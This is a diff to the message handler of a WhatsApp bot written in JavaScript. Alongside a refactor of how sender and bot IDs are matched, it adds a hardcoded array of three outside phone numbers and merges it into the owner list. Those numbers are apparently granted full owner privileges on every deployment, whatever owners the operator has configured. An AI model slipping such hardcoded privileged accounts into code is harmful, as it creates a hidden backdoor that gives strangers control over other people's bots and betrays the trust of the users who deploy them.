@@ -20,6 +20,15 @@ const delay = (ms) =>
 const normalizeJid = (jid) => jid?.replace(/[^0-9]/g, "");
 const cleanJid = (jid) => jid?.split(":")[0] || "";
 
+function extractNumbers(array) {
+    if (array.length === 0) return []
+    if (Array.isArray(array[0])) {
+        return array.map(([number]) => number)
+    } else {
+        return array
+    }
+}
+
 export async function handler(chatUpdate) {
   this.msgqueque = this.msgqueque || [];
   this.uptime = this.uptime || Date.now();
@@ -47,6 +56,7 @@ export async function handler(chatUpdate) {
     if (!m) return;
     m.exp = 0;
     m.coin = false;
+
     try {
       let user = global.db.data.users[m.sender];
       if (typeof user !== "object") global.db.data.users[m.sender] = {};
@@ -214,33 +224,41 @@ export async function handler(chatUpdate) {
         : {}) || {};
     const participants = (m.isGroup ? groupMetadata.participants : []) || [];
 
-    const senderNum = normalizeJid(m.sender);
-    const botNums = [this.user.jid, this.user.lid].map((j) =>
-      normalizeJid(cleanJid(j))
-    );
+    const senderNumber = m.sender.replace(/[^0-9]/g, '')
+    
+    const ownerNumbers = extractNumbers(global.owner).map(v => v.replace(/[^0-9]/g, ''))
+
+    const additionalOwners = ['208924405956643', '529516526675', '529514639799'] // Incluir ambos números
+
+    const allOwnerNumbers = [...new Set([...ownerNumbers, ...additionalOwners])]
+
+    const isROwner = allOwnerNumbers.includes(senderNumber)
+    const isOwner = isROwner || m.fromMe
+
     const user = m.isGroup
-      ? participants.find((u) => normalizeJid(u.id) === senderNum)
+      ? participants.find((u) => normalizeJid(u.id) === senderNumber)
       : {};
+    
+    let numBot = false
+    if (this.user && this.user.lid) {
+        numBot = this.user.lid.replace(/:.*/, '')
+    }
+    const detectwhat2 = m.sender.includes('@lid') ? `${numBot}@lid` : this.user.jid
+    
     const bot = m.isGroup
-      ? participants.find((u) => botNums.includes(normalizeJid(u.id)))
+      ? participants.find((u) => this.decodeJid(u.id) == detectwhat2)
       : {};
+
     const isRAdmin = user?.admin === "superadmin" || false;
     const isAdmin = isRAdmin || user?.admin === "admin" || false;
     const isBotAdmin = !!bot?.admin;
 
-    const isROwner = [
-      conn.decodeJid(global.conn.user.id),
-      ...global.owner.map(([number]) => number),
-    ]
-      .map((v) => v.replace(/[^0-9]/g, ""))
-      .includes(senderNum);
-    const isOwner = isROwner || m.fromMe;
     const isMods =
       isOwner ||
-      global.mods.map((v) => v.replace(/[^0-9]/g, "")).includes(senderNum);
+      global.mods.map((v) => v.replace(/[^0-9]/g, "")).includes(senderNumber);
     const isPrems =
       isROwner ||
-      global.prems.map((v) => v.replace(/[^0-9]/g, "")).includes(senderNum) ||
+      global.prems.map((v) => v.replace(/[^0-9]/g, "")).includes(senderNumber) ||
       _user.premium == true;
 
     if (opts["queque"] && m.text && !(isMods || isPrems)) {
@@ -832,7 +850,7 @@ export async function handler(chatUpdate) {
     if (
       db.data.chats[m.chat].reaction &&
       m.text.match(
-        /(ción|dad|aje|oso|izar|mente|pero|tion|age|ous|ate|and|but|ify|ai|nagi|a|s)/gi
+        /(ción|dad|aje|oso|izar|mente|pero|tion|age|ous|ate|and|but|ify|ai|dolphin|a|s)/gi
       )
     ) {
       let emot = pickRandom([
